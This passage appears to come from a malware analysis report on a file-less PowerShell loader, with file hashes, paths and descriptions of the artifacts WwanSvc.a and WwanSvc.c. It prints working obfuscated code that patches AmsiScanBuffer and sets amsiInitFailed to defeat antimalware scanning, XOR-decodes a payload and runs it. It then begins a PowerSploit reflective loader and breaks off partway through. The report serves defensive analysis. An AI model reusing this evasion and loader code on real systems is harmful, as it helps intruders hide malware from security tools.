[System.Runtime.InteropServices.Marshal]::\"GE`Tdel`egATE`FoR`FUNc`T`i`OnPOiNTER\".Invoke(${WP`mA`Ddr}, ${WP`m`del})\n\t\t\t${W`32} | AD`d`-member -MemberType (('No'+'t')+'eP'+('rop'+'er')+'ty') -Name ('Wr'+'it'+('eP'+'r')+'o'+('ce'+'s'+'sMemory')) -Value ${W`Pm}\n\n\t\t\t${GETMoDu`L`e`Ha`NdLeAdDR} = g`Et-pROCAdd`R`eSS (('ker'+'n')+'e'+'l'+('32'+'.'+'dll')) ('Ge'+'t'+('M'+'od')+('u'+'le')+('Ha'+'ndl'+'eA'))\n\t\t\t${gET`Mo`dUleHa`N`dLEDELegAte} = geT`DELT`Y`pE @([String]) ([IntPtr])\n\t\t\t${Get`moDU`leH`ANDLE} = [System.Runtime.InteropServices.Marshal]::\"GET`DElEGATEFor`F`U`N`CtION`POi`NTeR\".Invoke(${GeTmod`U`LeHa`NdL`eAddr}, ${ge`T`Mo`DUlEhAN`Dled`eLeGAte})\n\t\t\t${W`32} | Add-Me`mB`ER ('No'+('te'+'P'+'rop')+('er'+'ty')) -Name (('Get'+'M')+'od'+('ule'+'Han'+'dle')) -Value ${g`et`MoDUL`EH`ANDlE}\n\n\t\t\t${GEtpr`Oc`ADdRessA`DdR} = gEt-pR`o`C`ADDrE`sS (('k'+'er')+'ne'+('l32'+'.')+('d'+'ll')) ('Ge'+'t'+('P'+'ro')+'cA'+('ddr'+'ess'))\n\t\t\t${gEt`ProCADDRE`SSdE`LegA`Te} = GEtD`eLT`y`pe @([IntPtr], [String]) ([IntPtr])\n\t\t\t${Get`prOcaDd`R`ESS} = [System.Runtime.InteropServices.Marshal]::\"GET`d`ElEgAT`E`FORfUNct`Io`N`pO`inTeR\".Invoke(${GeTpROCA`Ddr`e`S`Sa`DDr}, ${geTp`RoCadD`R`EssDeLEG`ATe})\n\t\t\t${w`32} | ADD`-m`EmBer -MemberType ('No'+'te'+('P'+'ro')+('pe'+'rty')) -Name (('G'+'et')+'P'+('rocAd'+'dre')+'s'+'s') -Value ${Ge`Tp`ROCaDDrE`SS}\n\n\t\t\t${mE`Mc`py`AdDr} = Ge`T-pR`oC`Add`REss ('ms'+('vc'+'rt.')+('d'+'ll')) (('m'+'em')+('c'+'py'))\n\t\t\t${MeM`c`pydeLE`GatE} = g`et`DeLtyPE @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])\n\t\t\t${M`EmcpY} = [System.Runtime.InteropServices.Marshal]::\"Ge`TDelegATEfOrf`UnC`TiONP`OINT`Er\".Invoke(${m`EmCPY`Ad`DR}, ${me`Mcpy`de`legatE})\n\t\t\t${W`32} | aDd-M`eMb`ER -MemberType (('No'+'t')+'e'+('P'+'ro')+('pert'+'y')) -Name ('me'+'m'+('cp'+'y')) -Value ${ME`mc`pY}\n\n\n\t\t\treturn ${W`32}\n\t\t\t}\n\n\n\t\t\t[UInt32]${O`LdPrOtectFl`Ag} = 0\n\t\t\t${W`i`N32} = GEt`W32\n\t\t\t${a`mSi} = ${W`in32}.\"G`Et`mODulehA`Ndle\".\"iNvO`KE\"(('ams'+'i'+'.dll'))\n\t\t\tif (${aM`Si} -ne 0) {\n\t\t\t${P`ROC} = ${w`in`32}.\"G`etPROCAD`dr`ess\".\"In`Vo`kE\"(${a`MSI}, ('A'+'m'+'s'+'iScanB'+'uffer'))\n\t\t\tif (${P`Roc} -ne 0) {\n\t\t\tif ([IntPtr]::\"sI`zE\" -eq 8) {\n\t\t\t${paT`cH} = @( 0x48, 0x31, 0xC0, 0xC3 )\n\t\t\t} else {\n\t\t\t${pAT`Ch} = @( 0x31, 0xC0, 0xC3 )\n\t\t\t}\n\n\t\t\t${r`es} = ${wI`N`32}.\"Vi`RtUaLpRoT`E`CT\".\"I`NVoKE\"(${P`RoC}, [UInt32]${pA`TcH}.\"LEn`GTH\", 0x40, [Ref]${OldproT`e`c`TF`Lag})\n\t\t\tif (${R`Es} -ne 0)\n\t\t\t{\n\t\t\tfor (${Of`Fs`et} = 0; ${offs`ET} -lt ${PAt`cH}.\"lENg`Th\"; ${oFF`s`Et}++)\n\t\t\t{\n\t\t\t\u00a0\u00a0\u00a0[System.Runtime.InteropServices.Marshal]::\"Wr`iT`EbY`Te\".Invoke(${P`Roc}, ${Of`FseT}, ${p`AT`cH}[${OfFs`ET}]);\n\t\t\t}\n\t\t\t}\n\t\t\t}\n\t\t\t}\n\n\t\t\t${Dat`A0}= [IO.File]::\"r`eA`dAl`LbyTES\".Invoke((('C:pk'+'Wp'+'rogramda'+'t'+'apkWMic'+'r'+'osoft'+'p'+'kWWw'+'an'+'S'+'v'+'c.a').REplACe(([ChAR]112+[ChAR]107+[ChAR]87),'\\')))\n\t\t\t${dA`Ta1}= [IO.File]::\"reA`DAlL`Byt`eS\".Invoke((('C:F'+'zCprog'+'r'+'amdat'+'aF'+'zCMi'+'cros'+'o'+'f'+'t'+'FzCW'+'wanSvc'+'.c') -replACe([chaR]70+[chaR]122+[chaR]67),[chaR]92))\n\n\t\t\tfor(${i}=0; ${I} -lt ${Da`TA1}.\"COu`Nt\" ; ${i}++) { ${da`T`A1}[${I}] = (${dAT`A1}[${I}] -bxor ${dA`TA0}[${i} % ${D`A`TA0}.\"cO`UNT\"])}\n\t\t\t${d`A`Ta1} = [System.Text.Encoding]::\"ASc`iI\".\"g`ets`Tring\"(${Da`TA1})\n\n\t\t\ttry { ${L}=[Ref].\"AS`s`EMBlY\".\"GE`TT`YPE\"(('Sy'+'stem.M'+'anagem'+'en'+'t.A'+'uto'+'m'+'ation.A'+'m'+'siU'+'t'+'ils')); if (${L} -ne 0) { ${f}=${L}.\"gET`FiEld\"(('amsi'+'Ini'+'tF'+'ailed'),('NonPub'+'l'+'i'+'c,Static')); if (${f} -ne 0) { ${F}.\"sET`V`ALUE\"(${nu`lL},${TR`UE}); wrI`TE`-HosT ('k') }; }; WritE-H`o`st \".\" } catch { Wri`TE-`HOst ${_} }\n\n\t\t\tI`Nvo`Ke-E`xPRe`SS`ion -Command ${D`ATA1}\n\t\t\t---End Decoded PowerShell Script---\n\n\t\t\tThe script allows PowerShell to run without system restrictions while bypassing the Microsoft Antimalware program. Next, the script decodes the file \"WwanSvc.c\" (d3d5e5a8a40f34fc8d89b2d74d89a4b101d8b95a79e990e3b4161282aa6aca32) using a bitwise Exclusive OR (XOR) with a 256 byte key that is found in WwanSvc.a (dec8655cdd7214daf9579ef481d0b0c6ed8120c120d3bd8ec27cb6e1874eb291). Both WwanSvc.a and WwanSvc.c are located in C:\\ProgramData\\Microsoft\\. The newly decoded script is then executed using the InvokeExpression command.\n\n\ndec8655cdd7214daf9579ef481d0b0c6ed8120c120d3bd8ec27cb6e1874eb291\nTags\nloaderobfuscated\nDetails\n\n\n\nName\nWwanSvc.a\n\n\nSize\n256 bytes\n\n\nType\ndata\n\n\nMD5\n77b6cc5bca517f2d4c954d3d8c8c67df\n\n\nSHA1\nff9b181fe3f3b15b37ab8823fc47119c310fc51f\n\n\nSHA256\ndec8655cdd7214daf9579ef481d0b0c6ed8120c120d3bd8ec27cb6e1874eb291\n\n\nSHA512\na70ff48b0a2a7d8bac1fb4b2df7b27a26e3ce974ae6927611e764a5ebe7892ab468b0a3537c47de7195f7787f5c781d686e4ece0f339174e51563b546cdbaf3a\n\n\nssdeep\n6:nZmAvoD0jmQw0fCRj6DoSbTrbBKgqtjQUOjv6g7RH:toojn1CRj6DoSbTrl1WQjig7RH\n\n\nEntropy\n8.000000\n\n\nPath\nC:\\ProgramData\\Microsoft\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\ndec8655cdd...\nUsed_By\n4de1bd4b1bb28ed0897b9d3c5d16a4b1442c7f53cb389cbed82af189696d3f40\n\n\ndec8655cdd...\nUsed_By\nc5a1dbb49ff72a69ac7c52b18e57a21527bc381077b1cea12c3a40e9e98ae6cd\n\n\n\nDescription\nThis artifact contains a 256 byte key that is used by the base64 encoded script in WwanSvc.txt to decode a new PowerShell script in WwanSvc.c (d3d5e5a8a40f34fc8d89b2d74d89a4b101d8b95a79e990e3b4161282aa6aca32). The key is also used to decode the reflectively loaded payload in WwanSvc.b (d3d5e5a8a40f34fc8d89b2d74d89a4b101d8b95a79e990e3b4161282aa6aca32).\n\n\nd3d5e5a8a40f34fc8d89b2d74d89a4b101d8b95a79e990e3b4161282aa6aca32\nTags\nfile-lessloaderobfuscated\nDetails\n\n\n\nName\nWwanSvc.c\n\n\nSize\n121572 bytes\n\n\nType\ndata\n\n\nMD5\n23fd1bca24a1f68293096ba9022bd0f1\n\n\nSHA1\n2ab0d1092127268f30490523ec0aa3736416096b\n\n\nSHA256\nd3d5e5a8a40f34fc8d89b2d74d89a4b101d8b95a79e990e3b4161282aa6aca32\n\n\nSHA512\n37ac754b31bc0a8246111e621b544e5c00c6c8330b6858895e35368f39d973b63f24eb73dd0cc9964991f59ea6720c269a55192f4751b8dc7c7e8f958541d3d9\n\n\nssdeep\n3072:LkBl3uCZsVZFN41v7cV7PBbC4/ggW7hPe1G8zW6:Y2FGZ7ebNFW7hG1fL\n\n\nEntropy\n7.998578\n\n\nPath\nC:\\ProgramData\\Microsoft\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\nd3d5e5a8a4...\nUsed_By\n4de1bd4b1bb28ed0897b9d3c5d16a4b1442c7f53cb389cbed82af189696d3f40\n\n\n\nDescription\nThis artifact is a XOR encoded PowerSploit reflective loader program. The program is decoded using the 256 byte key found in WwanSvc.a (dec8655cdd7214daf9579ef481d0b0c6ed8120c120d3bd8ec27cb6e1874eb291). The decoded content of the script follows:\n\n\t\t\t---Begin Decoded Script Content---\n\t\t\t$PEBytes = $null\n\n\t\t\tfunction RemoteScriptBlock ($FuncReturnType, $ProcId, $ProcName, $ForceASLR)\n\n\t\t\t\u00a0\u00a0\u00a0###################################\n\t\t\t\u00a0\u00a0\u00a0########## Win32 Stuff ##########\n\t\t\t\u00a0\u00a0\u00a0###################################\n\t\t\t\u00a0\u00a0\u00a0Function Get-Win32Types\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types = New-Object System.Object\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Define all the structures/enums that will be used\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0# \u00a0\u00a0\u00a0This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Domain = [AppDomain]::CurrentDomain\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]\n\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0############ \u00a0\u00a0\u00a0ENUM \u00a0\u00a0\u00a0############\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Enum MachineType\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$MachineType = $TypeBuilder.CreateType()\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Enum MagicType\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$MagicType = $TypeBuilder.CreateType()\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Enum SubSystemType\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$SubSystemType = $TypeBuilder.CreateType()\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Enum DllCharacteristicsType\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$DllCharacteristicsType = $TypeBuilder.CreateType()\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0########### \u00a0\u00a0\u00a0STRUCT \u00a0\u00a0\u00a0###########\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Struct IMAGE_DATA_DIRECTORY\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Struct IMAGE_FILE_HEADER\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Struct IMAGE_OPTIONAL_HEADER64\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 